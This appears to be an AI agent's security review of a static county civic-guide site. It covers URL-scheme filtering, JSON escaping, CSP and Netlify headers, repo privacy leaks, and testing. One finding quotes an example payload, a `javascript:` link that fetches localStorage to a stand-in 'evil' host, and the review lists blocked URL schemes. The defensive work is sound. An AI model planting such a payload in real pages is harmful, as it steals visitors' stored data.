# Security review: Indiana County Civic Guide (2026-11-09)

Scope: the static-site generator (`tools/site/`), its client JavaScript, the built output (`site/st-joseph/`), the
public GitHub repo and its history, and readiness for Netlify hosting. Nothing was deployed, pushed, committed or
connected. Nick reviews the diff.

The site is static: no server code, no logins, no forms that send data anywhere, no cookies. The realistic threats
are (a) hostile text in the CSVs (copied from PDFs, news and web pages) turning into script or a dangerous link,
(b) third-party loads, (c) private material leaking through the public repo or the published folder, and
(d) missing browser protections once it is on a public host.

## Findings by severity

### Medium

**M1. Links from data could carry `javascript:` / `data:` URLs (fixed).**
`civic/html.py attrs()` escaped every attribute value but did not check URL schemes, and several builders put a
CSV value straight into `href`: `pages/elections.py:677` (source URL, no check), `pages/participate.py:632`,
`pages/places.py:1264` (district website), `pages/campaigns.py:850`, `pages/community_history.py:1026/1045/1346`,
`pages/data_sets.py:40`. (`components.py Citations.render` already required an `http` prefix.)
Exploit: a source row or `units.csv website` reading `javascript:fetch('//evil/'+localStorage...)` (pasted by
mistake or planted in a copied source) becomes a working link on a public page; one click runs script in the
site's origin. Today no data value does this (the scan found only `http:`/`https:` hrefs), so this was latent.
Fix: `attrs()` now drops any `href`, `src`, `xlink:href`, `action`, `formaction`, `poster`, `cite`, `background`
or `ping` whose scheme is not http, https, mailto or tel (relative paths, `?query` and `#fragment` pass), using the
browser's own parsing rules (leading control characters, tab/newline inside the scheme, entities in `Markup`). The
link then renders as plain text and the build prints `WARNING: unsafe URL dropped ...` to stderr; the values are
also kept in `civic.html.BLOCKED_URLS`. New public helper `safe_url()`. Signature of `attrs()`/`h()` unchanged; the
output differs only for unsafe URLs.

**M2. `json_script` wrote invalid JSON for `<!--` (fixed).**
`civic/html.py json_script` replaced `<!--` with `<\!--`, which is not a valid JSON escape: any data string
containing `<!--` would make `JSON.parse` throw, and the page feature reading that block (map, picker, here bar,
results explorer) would silently stop working. It also left `<script` unescaped, which inside an HTML comment
opener puts the parser in the "double escaped" state. Not exploitable for script execution, but a data-driven
breakage of whole pages.
Fix: every `<` is now written as `\u003c` (and U+2028/U+2029 as escapes). Parsed values are identical; no data can
close the block or change parser state. All 555k `<` in the current output now go through this escape.

**M3. No security headers or CSP for the public host (fixed: config written, not deployed).**
On Netlify with no config the site would be framable (clickjacking of the place picker is low value but free to
stop), would have no CSP backstop for any future escaping bug, and would send full referrers to the ~950 outside
sites it links to. See "Netlify config" below.

### Low

**L1. Personal Gmail address in the public repo's commit metadata (not fixed: history rewrite needs Nick).**
All 6 commits on `main` carry the author/committer Gmail address, readable by anyone who clones the repo or uses
GitHub's `.patch` view. Already on the Roadmap ("keep or replace the Gmail commit email"). Fix options (Nick's
call): set `git config user.email` to the GitHub `ID+login@users.noreply.github.com` address for future commits
and turn on GitHub's "Block command line pushes that expose my email"; rewriting the 6 existing commits needs a
force-push and is optional.

**L2. Windows user name and local paths in tracked files (not fixed: other agents' files, low value).**
About 20 tracked files (`tools/build_*.py`, `tools/res_*.py`, `research/*.md`, `planning/*.md`,
`docs/session-handoff.md`) hard-code `C:\Users\<name>\local-gov-guide`. It reveals the Windows account name and
folder layout, nothing more. None of it reaches the published site (scan of `site/st-joseph` found no local paths).
Optional clean-up: `Path(__file__).resolve().parents[1]` instead of the literal.

**L3. `moved.js` looked up `map.src[<hash>]` without an own-property check (fixed).**
`data/index.html#src-constructor` or `#src-__proto__` made `dest` a function/object and the script threw. Not a
redirect (destinations only come from the page's own JSON), but a hash anyone can craft. Fixed with
`hasOwnProperty` and a final guard that only follows a relative destination (no scheme, no `//host`). Checked in
Chromium: real forwards still work (`#ds-results-preview`, `#src-RES-001`, landscape `#bands`), crafted hashes no
longer throw.

**L4. Google Fonts: third-party request on every page (left, recommendation).**
Every page loads CSS from fonts.googleapis.com and files from fonts.gstatic.com, so each reader's IP address and
the page they are on (via Referer, now trimmed to the origin by Referrer-Policy) reach Google. SRI is not possible
(Google serves different CSS per browser). The CSP limits fonts to exactly those two hosts. Self-hosting the
WOFF2 files under `assets/fonts/` would remove the third party entirely and two CSP hosts; left because the three
theme agents are changing the font set today (`civic/shell.py FONTS`). Roadmap item added.

**L5. Local data tools use library versions with published CVEs (left: not part of the site, environment change).**
Installed: Pillow 12.1.0 (CVE-2026-25990, out-of-bounds write on a crafted PSD; fixed in 12.1.1) and pypdf 6.9.1
(several 2026 denial-of-service CVEs on crafted PDFs; the newest fixed release seen is 6.21.2). PyMuPDF 1.27.1,
pdfminer.six 20251230. Used only by local scripts that read downloaded public PDFs and images
(`tools/build_assessed_values.py`, `tools/ocr_2020_precinct_report.py`, `tools/render_cf_pages.py`); the site
generator itself is standard library only and there is no requirements file or Node package. Suggested:
`python -m pip install -U "Pillow>=12.1.1" "pypdf>=6.21.2"`. Not run, because it changes Nick's global Python.

**L6. `site/images/` is not in git (Netlify readiness, left for Nick).**
`/site/` is git-ignored, and so are the licensed portraits and photos the build copies from `site/images/`. A
Git-connected Netlify build would publish pages with broken images. Deploy from a local build, or track the images
(they would then be public on GitHub; check each license first).

### Informational (checked, no issue)

- Escaping: every page module builds HTML with `h()`; there are only 10 `Markup(...)` uses outside `html.py`, all
  on literals or on already-built markup (`shell.py:189-194, 341, 391, 402, 410`, `components.py:367, 417`,
  `elections.py:1620`). No string-concatenated HTML of data anywhere. Style attributes carry only numbers formatted
  by the builders. Inline SVG is built with `h()`. The two SVG image files contain no script or external refs.
- Client JS (all of `static/app.js` + `static/js/*.js`): no `innerHTML`, `outerHTML`, `insertAdjacentHTML`,
  `document.write`, `eval`, `new Function`, `postMessage` or message listeners. Data goes in with `textContent`.
  localStorage values are validated before use: `civic-theme` only "light"/"dark", `civic-look` only the three
  looks, `civic-place` normalized against the known place/township/school ids with `hasOwnProperty`. Hash-driven
  lookups use fixed regexes and `getElementById`. Links built in JS are relative to the site root.
- `target="_blank"`: all 950+ such links carry `rel="noopener"`.
- Built output (`site/st-joseph`): no `.git`, no source CSVs beyond the intended open-data copies on the `/data/`
  pages (column headers checked; `notes` columns are public-facing notes), no local paths, only government contact
  emails (voter@...). Git history: no keys, tokens, `.env`, private keys, logs or raw document text dumps.
- CSV formula injection (Copy CSV): no data cell starts with `=`, `+`, `-` or `@` in a way a spreadsheet would run.
  When real CSV downloads are added on Netlify, prefix such cells with `'` in the download only.
- 12 outside links are plain `http://` (source URLs in the data). They are navigations, not loaded resources, so
  there is no mixed content; switching them to https is a data edit for the fact-checkers.

## Netlify config written (nothing deployed)

The plan of record (`planning/build-plan.md`, hosting target 2) says "Netlify static. Same output". No publish
directory or build command was planned, so the config publishes `site/st-joseph` at the domain root.

| File | What it does |
|---|---|
| `netlify.toml` (repo root) | `publish = "site/st-joseph"`; build command `build.py --edition st-joseph --check && netlify_prep.py site/st-joseph`; `PYTHON_VERSION = "3.13"`. Comments explain the `site/images/` gap (L6). |
| `tools/site/netlify/_headers` | Source of truth for the response headers. Copied into the publish folder because a `_headers` file there works for every deploy method, including drag-and-drop. |
| `tools/site/netlify/404.html` | Not-found page template (root-absolute links, site stylesheet, `noindex`). |
| `tools/site/netlify_prep.py` | Run after the build: makes the Artifact-host fragment `index.html` a full document (doctype, `<html lang>`, charset, viewport; without it the home page renders in quirks mode with no phone viewport on Netlify), copies `_headers`, writes `404.html`, then refuses (exit 1) if any executable inline script is not in the CSP's hash list, or any page has an `on*=` handler or a `<style>` element. |

Headers on every path:

```
Content-Security-Policy: default-src 'none'; script-src 'self' 'sha256-<LOOK_BOOT>'; style-src 'self' https://fonts.googleapis.com;
  style-src-attr 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self'; connect-src 'self';
  manifest-src 'self'; form-action 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none'
X-Content-Type-Options: nosniff        X-Frame-Options: DENY        Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera, microphone, geolocation, payment, usb, sensors, autoplay, display-capture, midi, browsing-topics all ()
Cross-Origin-Opener-Policy: same-origin        Strict-Transport-Security: max-age=31536000
```

- Scripts: no `'unsafe-inline'`, no `'unsafe-eval'`. The only executable inline script is `civic/shell.py LOOK_BOOT`
  (applies the saved look/theme before first paint, so moving it to a file would cause a flash); it is allowed by
  its sha256. `tools/tests/test_netlify_prep.py` fails if LOOK_BOOT changes without the hash being updated, and
  `netlify_prep.py` fails the deploy build on any unlisted inline script. The 30+ `<script type="application/json">`
  data blocks are never executed, so CSP does not apply to them.
- What remains `'unsafe-inline'`: only `style-src-attr`, for ~1,300 `style="..."` attributes the builders write
  (bar widths, chart positions, table min-widths). Hashing them is impractical and every value is escaped and
  numeric; inline `<style>` elements stay blocked. Moving them to classes or CSS custom properties set from JS is
  possible later. (Safari older than 15.4 does not know `style-src-attr` and would drop those attributes.)
- HSTS has no `includeSubDomains`/`preload`, so it cannot affect other subdomains of a custom domain.
- Caching: `/images/*` one day plus a week of stale-while-revalidate. HTML, `assets/app.js`, `assets/style.css`
  and the JSON files keep Netlify's default (always revalidate with ETag), because their names carry no content
  hash and a new deploy must never pair new HTML with an old script.

### How the CSP was tested

1. Copied the built `site/st-joseph` to the scratchpad, ran `netlify_prep.py` on the copy (the shared output was
   not touched), and served it with a small Python `http.server` that sends exactly the `_headers` rules (and
   Netlify's MIME types, 404 page) on port 8797.
2. Playwright (Chromium) loaded all 113 pages, the 404 page and `map/index.html#layer-precinct`, with a
   `securitypolicyviolation` listener installed before any page script, and exercised each page: theme toggle,
   look switch, header search (typing, arrow keys), place picker, map shape click (boundary, district, campaign,
   vote layers), chart hover, Copy CSV (table and dataset), the first `select` (tax bill, shade-by, race picker),
   a fold; then a second pass with a saved place (here bar, preselect, your-place cards).
   Result: **0 CSP violations** in 116 page loads and 769 interactions, on the build before and after the fixes.
   No page errors; only console error was the intended 404. (4 Copy CSV clicks timed out in the harness because
   another element covered the button in the headless layout; not a CSP matter.) Fonts loaded (11 faces), `data-look` set by the hashed
   boot script, home page in standards mode with a viewport.
3. Negative control: the same page with the hash and `style-src-attr` removed from the header produced
   `script-src-elem` and `style-src-attr` violations, so the detector works.

## Tests and build

- New: `tools/tests/test_security_escaping.py` (19 tests: hostile URL schemes incl. mixed case, control characters,
  tab/newline, entity-encoded Markup; quote breakout; text escaping; JSON block round trip with `</script>`,
  `<!--`, U+2028; a Sources list fed a hostile source row; data_table cells; and a scan of the built site for
  unsafe URL attributes, unparseable or breakable JSON blocks, inline event handlers, and exactly one inline
  script per page). `tools/tests/test_netlify_prep.py` (7 tests: LOOK_BOOT hash in the CSP, CSP strictness, other
  headers, fragment-to-document, prep writes files, prep refuses CSP breakers, JSON blocks not flagged).
- `python -P -E -m unittest discover -s tools/tests`: 398 tests OK.
- Build (`build_locked.sh`, with the checker): PASSED, 113 pages.

## Deploy steps for later (only on Nick's deploy trigger)

1. `python -P -E tools/site/build.py --edition st-joseph --check`
2. `python -P -E tools/site/netlify_prep.py site/st-joseph`
3. Deploy the `site/st-joseph` folder (drag-and-drop or CLI), or connect the repo once the images question (L6) is
   settled. After the first deploy, check the response headers in the browser and run
   https://securityheaders.com or Mozilla Observatory against the URL.
4. Rebuild afterwards (or before the next Artifact publish): the prepared `index.html` is a full document, which
   the Artifact-host checker rejects until the next build rewrites it.
